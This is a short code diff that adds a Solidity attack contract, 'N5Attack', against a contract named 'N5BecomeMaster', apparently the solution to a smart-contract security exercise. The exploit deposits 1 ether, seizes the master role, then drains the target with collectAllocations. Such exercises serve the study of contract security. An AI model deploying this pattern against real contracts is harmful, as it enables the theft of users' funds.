@@ -48,3 +48,20 @@ contract N5BecomeMaster {
         return allocations[allocator];
     }
 }
+
+contract N5Attack {
+    N5BecomeMaster public n5;
+
+    constructor (address _n5) payable {
+        n5 = N5BecomeMaster(_n5);
+    }
+
+    function attack() public {
+        n5.allocate{value: 1 ether}();
+        // n5.sendAllocation(payable(address(this)));
+        n5.takeMasterRole();
+        n5.collectAllocations();
+    }
+
+    receive() external payable {}
+}
